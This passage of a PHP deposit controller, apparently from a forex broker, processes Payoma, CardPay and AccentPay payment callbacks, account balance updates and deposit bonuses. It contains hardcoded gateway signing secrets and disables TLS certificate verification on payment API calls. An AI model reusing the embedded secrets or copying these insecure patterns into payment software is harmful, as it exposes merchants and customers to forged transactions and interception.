                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);

                        $updateData = ['status' => 0];
                        $this->general_model->updatemy('payoma', 'order_id', $orderXMLObj->merchant_order_id, $updateData);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYOMA'].$orderXMLObj->transaction_id);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYOMA'].$orderXMLObj->transaction_id);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                $this->account_model->updateAccountBalance($account_number, $balance);
                            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    if (IPLoc::APIUpgradeDevIP()) {
                        FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                    } else {
                        FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    }

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['additional_tenp_bonus']){
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus10Percent($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'tenpb', $data['transaction_id']);
//                    }

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'rhpb', $data['transaction_id']);
//                        }
//                    }
//
//                    if ($invData['additional_tenp_bonus']) {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'tenpb', $data['transaction_id']);
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', $invData['bonus'], $data['transaction_id'], false);

                    if ($invData['additional_tenp_bonus']) {
                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
                        self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'PAYOMA', 'tenpb', $data['transaction_id'], true);
                    }

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $orderXMLObj->sum;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $orderXMLObj->sum,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('PAYOMA', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$orderXMLObj->transaction_id);
                    /* End **/
                }
            }
        } elseif ($orderXMLObj->status == 'failed') {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('payoma', 'order_id', $orderXMLObj->merchant_order_id, $updateData);

            if ($row = $this->general_model->where('payoma', ['order_id' => $orderXMLObj->merchant_order_id])) {
                $invData = $row->row_array();
                $data = [
                    'account_number' => $invData['account_number'],
                    'type' => 'payoma',
                    'reason' => 'Failed',
                ];
                $this->sendEmailFailedDeposit($data);

                //------- FXPP-12707 Start ---------------
                $sendPending = [
                    'account_number' => $invData['account_number'],
                    'time' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                    'payment_type' => 'Payoma',
                    'amount' => $orderXMLObj->sum.' '.$orderXMLObj->currency,
                    'transaction_id' => $orderXMLObj->transaction_id,
                ];

                if (IPLoc::APIUpgradeDevIP()) {
                    $this->load->library('Fx_mailer');
                    Fx_mailer::pending_deposit_with_issues($sendPending, 'forexmart.tester5@gmail.com');
                    Fx_mailer::pending_deposit_with_issues($sendPending, 'agus@forexmart.com');
//                    Fx_mailer::pending_deposit_with_issues($sendPending, "finance@forexmart.com");
                }
                //------- FXPP-12707 End ---------------
            }
        }
    }

    private function payomaXMLRequestData($data = [])
    {
        $xml = '<request>
    <version>1.0</version>
    <merchant_api_name>forexmartcy-api</merchant_api_name>
    <operation>purchase_request</operation>
    <params>
        <sum>'.$data['amount'].'</sum>
        <currency>'.$data['currency_type'].'</currency>
        <payment_system>card_payin</payment_system>
        <merchant_order_id>'.$data['order_id'].'</merchant_order_id>
<deny_duplicate_merchant_order_id>true</deny_duplicate_merchant_order_id>
        <merchant_client_id>'.$data['account_number'].'</merchant_client_id>
        <merchant_client_country>'.$data['country'].'</merchant_client_country>
        <merchant_client_city>'.$data['city'].'</merchant_client_city>
        <merchant_client_name>'.$data['name'].'</merchant_client_name>
        <merchant_client_email>'.$data['email'].'</merchant_client_email>
        <merchant_client_regdate>'.$data['regdate'].'</merchant_client_regdate>
        <merchant_comment>Forexmart deposit</merchant_comment>
<merchant_url_success>https://my.forexmart.com/deposit/payoma_success</merchant_url_success>
<merchant_url_failure>https://my.forexmart.com/deposit/payoma_failure</merchant_url_failure>
<merchant_url_callback>https://my.forexmart.com/deposit/payoma_callback</merchant_url_callback>
   </params>
</request>
        ';

        $url = 'https://engine.payoma.com';
        $encodeXml = base64_encode($xml);
        $API_signature = 'TwfZYxTD8YOvd7MY7XEa2SDZRCz6r9qY7TIZwVP1';
        $signature = sha1($API_signature.$encodeXml.$API_signature);

        $post = [
            'request' => $encodeXml,
            'signature' => $signature,
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        if ($decode = curl_exec($ch)) {
            $return = base64_decode($decode);
            $orderXMLObj = simplexml_load_string($return);

            redirect($orderXMLObj->data->url);  // redirect to payoma website.
        }

        return false;
    }

    private function payomaXMLRequestDataTest($data = [])
    {
        $xml = '<request>
    <version>1.0</version>
    <merchant_api_name>forexmartcy-api</merchant_api_name>
    <operation>purchase_request</operation>
    <params>
        <sum>'.$data['amount'].'</sum>
        <currency>'.$data['currency_type'].'</currency>
        <payment_system>card_payin</payment_system>
        <merchant_order_id>'.$data['order_id'].'</merchant_order_id>
<deny_duplicate_merchant_order_id>true</deny_duplicate_merchant_order_id>
        <merchant_client_id>'.$data['account_number'].'</merchant_client_id>
        <merchant_client_country>'.$data['country'].'</merchant_client_country>
        <merchant_client_city>'.$data['city'].'</merchant_client_city>
        <merchant_client_name>'.$data['name'].'</merchant_client_name>
        <merchant_client_email>'.$data['email'].'</merchant_client_email>
        <merchant_client_regdate>'.$data['regdate'].'</merchant_client_regdate>
        <merchant_comment>Forexmart deposit</merchant_comment>
<merchant_url_success>https://my.forexmart.com/deposit/payoma_success</merchant_url_success>
<merchant_url_failure>https://my.forexmart.com/deposit/payoma_failure</merchant_url_failure>
<merchant_url_callback>https://my.forexmart.com/deposit/payoma_callback</merchant_url_callback>
   </params>
</request>
        ';

        $url = 'https://engine.payoma.com';
        $encodeXml = base64_encode($xml);
        $API_signature = 'TwfZYxTD8YOvd7MY7XEa2SDZRCz6r9qY7TIZwVP1';
        $signature = sha1($API_signature.$encodeXml.$API_signature);

        $post = [
            'request' => $encodeXml,
            'signature' => $signature,
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        if ($decode = curl_exec($ch)) {
            $return = base64_decode($decode);
            $orderXMLObj = simplexml_load_string($return);
            echo '<pre>';
            var_dump($orderXMLObj);
            exit();
            redirect($orderXMLObj->data->url);  // redirect to payoma website.
        }

        return false;
    }

    /* public function payomaUnitTest(){

       $xml = '<?xml version="1.0" encoding="UTF-8"?>
<response xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <version>1.0</version>
  <merchant_api_name>forexmartcy-api</merchant_api_name>
  <operation>purchase</operation>
  <data xsi:nil="true"/>
  <errors xsi:nil="true"/>
  <params/>
  <transaction_id>3968350</transaction_id>
  <merchant_order_id>1120851538037084</merchant_order_id>
  <merchant_client_id>192912</merchant_client_id>
  <merchant_comment>Forexmart deposit</merchant_comment>
  <sum>1.00</sum>
  <currency>USD</currency>
  <status>success</status>
  <cardnumber>411111******1111</cardnumber>
  <cardholder>TEST</cardholder>
  <cardexpire>01/19</cardexpire>
  <card_id>f135f4ab-99e3-4c4b-8891-966cc975b429</card_id>
  <client_info>
    <ip>115.127.83.18</ip>
    <ip_country></ip_country>
    <bank_country>US</bank_country>
  </client_info>
</response>
';

        $orderXMLObj = simplexml_load_string($xml);

        $this->payomaDepositProcess($orderXMLObj);

    }*/

    public function cardpay_v2()
    {
        if (!IPLoc::IPOnlyForVenus()) {
            redirect('');
        }

        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();

            $user_id = $this->session->userdata('user_id');
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);

            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
            /*  $this->form_validation->set_rules('card_number', 'Card number', 'trim|required|xss_clean');

                if (empty($_FILES['front_side']['name']) || empty($_FILES['back_side']['name'])) {
                $this->form_validation->set_rules('front_side', 'Fornt side', 'trim|required');
                $this->form_validation->set_rules('back_side', 'Back side', 'trim|required');
            }*/

            if ($this->form_validation->run() && !$data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'))) {
                /* $doc1 = "";
                 $doc2 = "";
                 $_FILES['userfile']['name'] = $_FILES['front_side']['name'];

                 $config['file_name'] = hash('haval192,4', time() . $_FILES['userfile']['name']);
                 $config['upload_path'] = './assets/user_docs';
                 $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                 $config['max_size'] = '10240';
                 $config['overwrite'] = false; // DO NOT CHANGE
                 $this->load->library('upload', $config);

                 if ($this->upload->do_upload('front_side')) {
                     $uploadData = $this->upload->data();
                     $doc1 = $uploadData['file_name'];
                 }
                 $_FILES['userfile']['name'] = $_FILES['back_side']['name'];

                 $config['file_name'] = hash('haval192,4', time() . $_FILES['userfile']['name']);
                 $config['upload_path'] = './assets/user_docs';
                 $config['allowed_types'] = 'gif|JPG|JPEG|jpg|jpeg|png|bmp|pdf';
                 $config['max_size'] = '10240';
                 $config['overwrite'] = false; // DO NOT CHANGE
                 $this->load->library('upload', $config);

                 if ($this->upload->do_upload('back_side')) {
                     $uploadData = $this->upload->data();
                     $doc2 = $uploadData['file_name'];
                 }*/

                $login_type = $this->session->userdata('login_type');
                $account_info = $this->general_model->whereConditionQuery($user_id);
                $currency = $account_info['currency'];
                $amount = $this->input->post('amount', true);
                $email = $this->session->userdata('email');
                $user_id = $this->session->userdata('user_id');
                $bonus = $this->input->post('bonus', true);

                $test_users = unserialize(TEST_USERS_DEPOSIT);
                if (in_array($user_id, $test_users)) {
                    $wallet_id = 28637;
                    // $wallet_id = 3717;
                    //$currency = 'RUB';
                    $encrypt_fields = 'account_number='.$account_info['account_number'].';'.'bonus='.$bonus.';'.'login_type='.$login_type;
                } else {
                    // switch($currency){
                    //     case 'MXN':
//                            $wallet_id  = 89075;
//                            $cardpay_secret_key  = '26T03rbAOVta';
//                            $terminal_password  = '9Ga5QIJ6tc8d';
                    // break; //Method: maestro, mastercard, visa

                    //}
                    $wallet_id = $this->wallet_id;
                    $encrypt_fields = 'account_number='.$account_info['account_number'].';'.'bonus='.$bonus.';'.'login_type='.$login_type;
                }
                $note = FXPP::encrypt_data($encrypt_fields, $this->encrypt_key);
                $description = 'Deposit on account number '.$account_info['account_number'];
                $date = new DateTime();
                $order_number = $date->getTimestamp();
                $order = '<order wallet_id="'.$wallet_id.'" number="'.$order_number.'" customer_id="'.$user_id.'" description="'.$description.'" currency="'.$currency.'" amount="'.$amount.'" email="'.$email.'" return_url="'.base_url('deposit/cardpay').'" note="'.$note.'" cancel_url ="'.base_url('deposit/cancel_cardpay').'"/>';
                if (in_array($user_id, $test_users)) {
                    //$sha512 = hash('sha512', $order . '9XKHl3nNp74t');
                    $sha512 = hash('sha512', $order.'95xIoCAR1n6l');
                } else {
                    //$sha512 = hash('sha512', $order . $cardpay_secret_key);
                    $sha512 = hash('sha512', $order.$this->cardpay_secret_key);
                }
                $orderXML = base64_encode($order);

                $payment_data = [
                    'sha512' => $sha512,
                    'order_xml' => $orderXML,
                    'order' => $order,
                ];

                /* $card_doc = array(
                     'account_number' => $account_info['account_number'],
                     'card_number'    => $this->input->post('card_number', true),
                     'order_id'       => $order_number,
                     'doc1'           => $doc1,
                     'doc2'           => $doc2,
                     'create_date'    => date('Y-m-d h:i:s'),
                     'amount'         => $amount

                 );

                 $this->general_model->insert('card_documents', $card_doc);
                */

                $this->load->view('deposits/cardpay_payment', $payment_data);
            } else {
//                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
//                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
//                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status === 'success') {
                    $data['success'] = true;
                } else {
                    $data['success'] = false;
                }
                //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $account = $this->general_model->whereConditionQuery($user_id);

                $data['account'] = $account;
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['currency']);
                $data['metadata_description'] = 'Payoma.';
                $this->template->title('ForexMart | Deposit - Payoma')
                    ->set_layout('internal/main')
                    ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                    ->build('deposits/cardpay', $data);
            }
        } else {
            redirect('signout');
        }
    }

    private function accentPayDepositProcess($accentPayData)
    {
        if ($accentPayData['payment']['status'] == 'success') {
            $paidAmount = ($accentPayData['payment']['sum']['amount'] / 100);

            if ($row = $this->general_model->where('accentpay', ['order_id' => $accentPayData['payment']['id'], 'status' => 0])) {
                $invData = $row->row_array();

                if (floatval($invData['amount']) == floatval($paidAmount)) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $amount = $paidAmount;
                    $total_amount = $this->get_convert_amount($paidAmount, $amount, $accData['currency']);
                    $currency = $accentPayData['payment']['sum']['currency'];

                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    // $fee = (($amount * 3.5)/100)+0.50; // Fee (3.5%)+ fixed feed(0.50$)

                    $fee = 0;
                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($currency, $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($currency, $bonus);
                    $amount -= $fee;

                    $conv_amount = $this->get_convert_amount($paidAmount, $amount, $accData['currency']);
                    $conv_amount_fee = $this->get_convert_amount($paidAmount, $fee, $accData['currency']);
                    $conv_amount_bonus = $this->get_convert_amount($paidAmount, $bonus, $accData['currency']);
                    $conv_amount_usd = $this->get_convert_amount($paidAmount, $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $accentPayData['payment']['id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'PAYOMA',
                        'payment_status' => $this->paymentType_status['Deposit via accentpay'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $accentPayData['payment']['id'],
                        'reference_id' => 0,
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'Payoma deposit',
                        'transaction_type' => 'ACCENTPAY',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via accentpay'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $accentPayData['payment']['id'],
                            'reference_id' => 0,
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'Accentpay deposit',
                            'transaction_type' => 'ACCENTPAY',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via accentpay'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$accentPayData['payment']['id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYOMA'].$accentPayData['payment']['id']);
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);

                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                        } else {
                            $insertDepositFailed['comment'] = $WebService2->request_status;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYOMA'].$accentPayData['payment']['id']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['PAYOMA'].$accentPayData['payment']['id']);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                $this->account_model->updateAccountBalance($account_number, $balance);
                            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1, 'payment_type' => $accentPayData['payment']['method'], 'account_number' => $accentPayData['account']['number']];
                    $this->general_model->updatemy('accentpay', 'order_id', $accentPayData['payment']['id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    if (IPLoc::APIUpgradeDevIP()) {
                        FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                    } else {
                        FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    }

                    /* ========================================== Welcome bonus================================================ **/

//                     if ($invData['bonus'] == "tenpb") {
//
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ACCENTPAY', 'tenpb', $data['transaction_id']);
//                    }

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ACCENTPAY', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ACCENTPAY', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ACCENTPAY', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'ACCENTPAY', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'ACCENTPAY', 'rhpb', $data['transaction_id']);
//                        }
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'ACCENTPAY', $invData['bonus'], $data['transaction_id'], false);

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('ACCENTPAY', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['ACCENTPAY'].$accentPayData['payment']['id']);
                    /* End **/
                }
            }
        } elseif ($accentPayData['payment']['status'] == 'decline') {
            $updateData = ['status' => 2, 'payment_type' => $accentPayData['payment']['method'], 'account_number' => $accentPayData['account']['number']];
            $this->general_model->updatemy('accentpay', 'order_id', $accentPayData['payment']['id'], $updateData);
        }
    }

    public function accentpay()
    {
        if (!IPLoc::Office()) {
            redirect('');
        }
        // if(!IPLoc::Office()){redirect('');}
        if (FXPP::isAccountFromEUCountry()) {
            redirect('');
        }

        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();

            $user_id = $this->session->userdata('user_id');
            $account_detail = $this->general_model->whereConditionQuery($user_id);
            $currency_conv = $account_detail['currency'];
            $acc_number = $account_detail['account_number'];

            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);
            //  if ($data['amount'] == null) {
            // $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");

            //  }

//            $hasInNdbBonus = $this->NodepositBonusValidation($user_id);
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                $user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created');
                $payment_id = $this->session->userdata('user_id').time();

                $this->load->library('ecommpay');

                $amount = ($this->input->post('amount', true) * 100);

                $ecommpay = new ecommpay();
                $ecommpay->setPaymentId($payment_id);
                $ecommpay->setTerminalCallbackUrl('https://my.forexmart.com/deposit/ecommpay_callback');
                $ecommpay->setCustomerId($this->session->userdata('user_id'));
                $ecommpay->setCustomerIp($this->input->ip_address());
                $ecommpay->setPaymentAmount($amount);
                $ecommpay->setPaymentCurrency('USD');
                $ecommpay->setDescription('test deposit');
                $ecommpay->setAccountNumber($this->input->post('account_number', true));
                $ecommpay->setSuccessUrl('https://my.forexmart.com/deposit/accentpay?status=successful');
                $ecommpay->setDeclineUrl('https://my.forexmart.com/deposit/accentpay?status=declined');
                $ecommpay->setReturnUrl('https://my.forexmart.com/deposit/accentpay');
                $ecommpay->setPaymentType($this->input->post('payment_type'));

                $insert_data = [
                    'account_number' => 0,
                    'amount' => $this->input->post('amount', true),
                    'order_id' => $payment_id,
                    'bonus' => $data['bounusfiled'],
                    'create_date' => date('Y-m-d h:i:s'),
                    'status' => 0,
